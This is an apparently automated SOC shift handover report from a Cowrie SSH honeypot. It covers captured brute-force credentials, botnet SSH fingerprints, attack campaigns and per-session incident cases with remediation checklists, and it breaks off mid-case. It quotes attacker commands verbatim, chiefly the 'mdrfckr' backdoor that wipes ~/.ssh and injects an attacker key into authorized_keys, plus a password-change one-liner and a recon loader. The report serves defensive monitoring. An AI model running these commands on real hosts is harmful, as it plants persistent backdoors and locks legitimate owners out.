# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-12 |
| **Generated At** | 2026-10-12T20:36:26Z |
| **Shift Time** | 20:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **416** |
| Confirmed Threats | **354** |
| False Positives Filtered | **62** (14.9%) |
| Unique Attacker IPs | **270** |
| Countries of Origin | **47** |
| High Severity Cases | **177** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **239** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2918** |
| Unique Credential Pairs | **2420** |
| Unique Usernames | **1343** |
| Unique Passwords | **1381** |
| Successful Auth Pairs | **2687** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 537 |
| `ubuntu` | 105 |
| `345gs5662d34` | 96 |
| `admin` | 90 |
| `support` | 32 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 96 |
| `` | 94 |
| `3245gs5662d34` | 90 |
| `123456` | 75 |
| `support` | 32 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 96 |
| `root` | `` | 94 |
| `root` | `3245gs5662d34` | 38 |
| `support` | `support` | 30 |
| `admin` | `admin` | 19 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `bitget` | `bitget` | `10.0.0.73` | 2026-10-12T02:55:05 |
| `kraken` | `kraken` | `10.0.0.73` | 2026-10-12T02:56:15 |
| `binance` | `binance` | `10.0.0.73` | 2026-10-12T02:57:25 |
| `binance` | `Binance@2026` | `10.0.0.73` | 2026-10-12T02:58:39 |
| `binance` | `Binance123` | `10.0.0.73` | 2026-10-12T02:59:55 |
| `binane` | `Binance1234` | `10.0.0.73` | 2026-10-12T03:01:13 |
| `support` | `support` | `10.0.0.73` | 2026-10-12T03:02:16 |
| `viomin2` | `viomin2` | `10.0.0.73` | 2026-10-12T03:02:29 |
| `user` | `user` | `10.0.0.73` | 2026-10-12T03:03:45 |
| `github` | `github` | `10.0.0.73` | 2026-10-12T03:05:06 |
| `root` | `000000` | `80.94.92.234` | 2026-10-12T03:05:18 |
| `eigenlayer` | `eigenlayer` | `10.0.0.73` | 2026-10-12T03:06:31 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.78.224.135` | 2026-10-12T03:06:54 |
| `*1` | `$4` | `34.78.224.135` | 2026-10-12T03:07:02 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7370` | `34.78.224.135` | 2026-10-12T03:07:04 |
| `root` | `111111` | `80.94.92.234` | 2026-10-12T03:07:53 |
| `root` | `eigenlayer` | `10.0.0.73` | 2026-10-12T03:07:56 |
| `ubuntu` | `eigenlayer` | `10.0.0.73` | 2026-10-12T03:09:23 |
| `root` | `123` | `80.94.92.234` | 2026-10-12T03:10:32 |
| `stream` | `stream` | `10.0.0.73` | 2026-10-12T03:10:53 |
_… 2667 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **416** |
| Sessions with Fingerprint | **30** |
| Unique HASSH Fingerprints | **30** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 140 |
| Go SSH scanner | 72 |
| PuTTY | 5 |
| Paramiko (Python) | 5 |
| OpenSSH | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 108 | 54 |
| `0a07365cc01f...` | Generic scanner | 13 | 5 |
| `2ec37a7cc8da...` | Mirai/variant | 12 | 4 |
| `16443846184e...` | Generic scanner | 11 | 4 |
| `f1e5e9d24e5e...` | Mirai/variant | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 108 | 54 | Mirai/variant |
| `95420f9d932d...` | libssh | 22 | 13 | — |
| `0a07365cc01f...` | Go SSH scanner | 13 | 5 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 12 | 4 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 11 | 4 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 8 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 8 | 7 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **23** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 189 | 4 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 67 | 47 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 66 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "nodered\nenL1iY6yBPPQ\nenL1iY6yBPPQ"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `173.249.52.138`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`, `80.94.92.55`, `2.57.122.150`, `195.178.110.217`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `46.253.45.10`, `107.150.105.153`, `52.172.177.191`, `172.190.51.254`, `124.193.81.23`, `89.134.210.246`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **270** |
| Unique ASNs | **119** |
| High-Risk ASNs | **83** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 56 | HIGH |
| `AS396982` | Google LLC | 14 | HIGH |
| `AS4766` | Korea Telecom | 14 | HIGH |
| `AS8075` | Microsoft Corporation | 10 | HIGH |
| `AS63949` | Akamai Connected Cloud | 7 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (170)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ba9f00f1e1bf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-10-12 03:05 |
| **Last Seen** | 2026-10-12 03:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:05:15` | `cowrie.session.connect` |
| `2026-10-12 03:05:15` | `cowrie.client.version` |
| `2026-10-12 03:05:15` | `cowrie.client.kex` |
| `2026-10-12 03:05:18` | `cowrie.login.success` |
| `2026-10-12 03:05:20` | `cowrie.session.params` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.success` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| `2026-10-12 03:05:20` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9842b04d6bd4

| Field | Detail |
|---|---|
| **Source IP** | `34.78.224[.]135` |
| **First Seen** | 2026-10-12 03:06 |
| **Last Seen** | 2026-10-12 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:06:54` | `cowrie.session.connect` |
| `2026-10-12 03:06:54` | `cowrie.login.success` |
| `2026-10-12 03:06:54` | `cowrie.session.params` |
| `2026-10-12 03:06:54` | `cowrie.command.input` |
| `2026-10-12 03:06:54` | `cowrie.command.input` |
| `2026-10-12 03:06:54` | `cowrie.command.failed` |
| `2026-10-12 03:06:54` | `cowrie.command.input` |
| `2026-10-12 03:06:55` | `cowrie.log.closed` |
| `2026-10-12 03:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.224[.]135` to AbuseIPDB if not already reported
- [ ] Block `34.78.224[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5c1004aa5d

| Field | Detail |
|---|---|
| **Source IP** | `34.78.224[.]135` |
| **First Seen** | 2026-10-12 03:07 |
| **Last Seen** | 2026-10-12 03:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:07:02` | `cowrie.session.connect` |
| `2026-10-12 03:07:02` | `cowrie.login.success` |
| `2026-10-12 03:07:03` | `cowrie.session.params` |
| `2026-10-12 03:07:03` | `cowrie.command.input` |
| `2026-10-12 03:07:03` | `cowrie.command.failed` |
| `2026-10-12 03:07:16` | `cowrie.log.closed` |
| `2026-10-12 03:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.224[.]135` to AbuseIPDB if not already reported
- [ ] Block `34.78.224[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6b7b87dd66

| Field | Detail |
|---|---|
| **Source IP** | `34.78.224[.]135` |
| **First Seen** | 2026-10-12 03:07 |
| **Last Seen** | 2026-10-12 03:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:07:04` | `cowrie.session.connect` |
| `2026-10-12 03:07:04` | `cowrie.login.success` |
| `2026-10-12 03:07:05` | `cowrie.session.params` |
| `2026-10-12 03:07:05` | `cowrie.command.input` |
| `2026-10-12 03:07:16` | `cowrie.log.closed` |
| `2026-10-12 03:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.224[.]135` to AbuseIPDB if not already reported
- [ ] Block `34.78.224[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28581f90a9a7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]132` |
| **First Seen** | 2026-10-12 03:22 |
| **Last Seen** | 2026-10-12 03:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:22:19` | `cowrie.session.connect` |
| `2026-10-12 03:22:19` | `cowrie.client.version` |
| `2026-10-12 03:22:19` | `cowrie.client.kex` |
| `2026-10-12 03:22:20` | `cowrie.login.success` |
| `2026-10-12 03:22:21` | `cowrie.session.params` |
| `2026-10-12 03:22:21` | `cowrie.command.input` |
| `2026-10-12 03:22:21` | `cowrie.log.closed` |
| `2026-10-12 03:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]132` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee07298d7087

| Field | Detail |
|---|---|
| **Source IP** | `168.167.228[.]123` |
| **First Seen** | 2026-10-12 03:32 |
| **Last Seen** | 2026-10-12 03:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:32:21` | `cowrie.session.connect` |
| `2026-10-12 03:32:21` | `cowrie.client.version` |
| `2026-10-12 03:32:21` | `cowrie.client.kex` |
| `2026-10-12 03:32:22` | `cowrie.login.success` |
| `2026-10-12 03:32:23` | `cowrie.session.params` |
| `2026-10-12 03:32:23` | `cowrie.command.input` |
| `2026-10-12 03:32:23` | `cowrie.command.failed` |
| `2026-10-12 03:32:24` | `cowrie.log.closed` |
| `2026-10-12 03:32:25` | `cowrie.session.params` |
| `2026-10-12 03:32:25` | `cowrie.command.input` |
| `2026-10-12 03:32:25` | `cowrie.session.file_download` |
| `2026-10-12 03:32:25` | `cowrie.log.closed` |
| `2026-10-12 03:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.228[.]123` to AbuseIPDB if not already reported
- [ ] Block `168.167.228[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec7467fe1296

| Field | Detail |
|---|---|
| **Source IP** | `168.167.228[.]123` |
| **First Seen** | 2026-10-12 03:32 |
| **Last Seen** | 2026-10-12 03:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:32:25` | `cowrie.session.connect` |
| `2026-10-12 03:32:25` | `cowrie.client.version` |
| `2026-10-12 03:32:25` | `cowrie.client.kex` |
| `2026-10-12 03:32:27` | `cowrie.login.success` |
| `2026-10-12 03:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.167.228[.]123` to AbuseIPDB if not already reported
- [ ] Block `168.167.228[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c63b5987c71

| Field | Detail |
|---|---|
| **Source IP** | `103.176.20[.]115` |
| **First Seen** | 2026-10-12 03:34 |
| **Last Seen** | 2026-10-12 03:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:34:35` | `cowrie.session.connect` |
| `2026-10-12 03:34:35` | `cowrie.client.version` |
| `2026-10-12 03:34:36` | `cowrie.client.kex` |
| `2026-10-12 03:34:37` | `cowrie.login.success` |
| `2026-10-12 03:34:38` | `cowrie.session.params` |
| `2026-10-12 03:34:38` | `cowrie.command.input` |
| `2026-10-12 03:34:38` | `cowrie.command.failed` |
| `2026-10-12 03:34:38` | `cowrie.log.closed` |
| `2026-10-12 03:34:39` | `cowrie.session.params` |
| `2026-10-12 03:34:39` | `cowrie.command.input` |
| `2026-10-12 03:34:40` | `cowrie.session.file_download` |
| `2026-10-12 03:34:40` | `cowrie.log.closed` |
| `2026-10-12 03:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.20[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.176.20[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-944a504ac503

| Field | Detail |
|---|---|
| **Source IP** | `103.176.20[.]115` |
| **First Seen** | 2026-10-12 03:34 |
| **Last Seen** | 2026-10-12 03:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:34:40` | `cowrie.session.connect` |
| `2026-10-12 03:34:40` | `cowrie.client.version` |
| `2026-10-12 03:34:40` | `cowrie.client.kex` |
| `2026-10-12 03:34:41` | `cowrie.login.success` |
| `2026-10-12 03:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.20[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.176.20[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e129ad97214

| Field | Detail |
|---|---|
| **Source IP** | `34.140.11[.]243` |
| **First Seen** | 2026-10-12 03:34 |
| **Last Seen** | 2026-10-12 03:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:34:57` | `cowrie.session.connect` |
| `2026-10-12 03:34:57` | `cowrie.login.success` |
| `2026-10-12 03:34:58` | `cowrie.session.params` |
| `2026-10-12 03:34:58` | `cowrie.command.input` |
| `2026-10-12 03:34:58` | `cowrie.command.input` |
| `2026-10-12 03:34:58` | `cowrie.command.failed` |
| `2026-10-12 03:34:58` | `cowrie.command.input` |
| `2026-10-12 03:34:58` | `cowrie.log.closed` |
| `2026-10-12 03:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.11[.]243` to AbuseIPDB if not already reported
- [ ] Block `34.140.11[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530dda83dc3d

| Field | Detail |
|---|---|
| **Source IP** | `34.140.11[.]243` |
| **First Seen** | 2026-10-12 03:35 |
| **Last Seen** | 2026-10-12 03:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:35:11` | `cowrie.session.connect` |
| `2026-10-12 03:35:11` | `cowrie.login.success` |
| `2026-10-12 03:35:12` | `cowrie.session.params` |
| `2026-10-12 03:35:12` | `cowrie.command.input` |
| `2026-10-12 03:35:12` | `cowrie.command.failed` |
| `2026-10-12 03:35:19` | `cowrie.log.closed` |
| `2026-10-12 03:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.11[.]243` to AbuseIPDB if not already reported
- [ ] Block `34.140.11[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad8310d9d31

| Field | Detail |
|---|---|
| **Source IP** | `34.140.11[.]243` |
| **First Seen** | 2026-10-12 03:35 |
| **Last Seen** | 2026-10-12 03:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:35:13` | `cowrie.session.connect` |
| `2026-10-12 03:35:13` | `cowrie.login.success` |
| `2026-10-12 03:35:14` | `cowrie.session.params` |
| `2026-10-12 03:35:14` | `cowrie.command.input` |
| `2026-10-12 03:35:19` | `cowrie.log.closed` |
| `2026-10-12 03:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.11[.]243` to AbuseIPDB if not already reported
- [ ] Block `34.140.11[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf349a77b8b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-12 03:42 |
| **Last Seen** | 2026-10-12 03:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:42:44` | `cowrie.session.connect` |
| `2026-10-12 03:42:44` | `cowrie.client.version` |
| `2026-10-12 03:42:44` | `cowrie.client.kex` |
| `2026-10-12 03:42:44` | `cowrie.login.success` |
| `2026-10-12 03:42:45` | `cowrie.direct-tcpip.request` |
| `2026-10-12 03:42:45` | `cowrie.direct-tcpip.data` |
| `2026-10-12 03:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7ce7c8ce8a

| Field | Detail |
|---|---|
| **Source IP** | `34.53.138[.]9` |
| **First Seen** | 2026-10-12 03:52 |
| **Last Seen** | 2026-10-12 03:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:52:08` | `cowrie.session.connect` |
| `2026-10-12 03:52:08` | `cowrie.client.version` |
| `2026-10-12 03:52:08` | `cowrie.client.kex` |
| `2026-10-12 03:52:10` | `cowrie.login.success` |
| `2026-10-12 03:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.138[.]9` to AbuseIPDB if not already reported
- [ ] Block `34.53.138[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95e3230d42c

| Field | Detail |
|---|---|
| **Source IP** | `218.78.63[.]123` |
| **First Seen** | 2026-10-12 03:55 |
| **Last Seen** | 2026-10-12 04:00 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

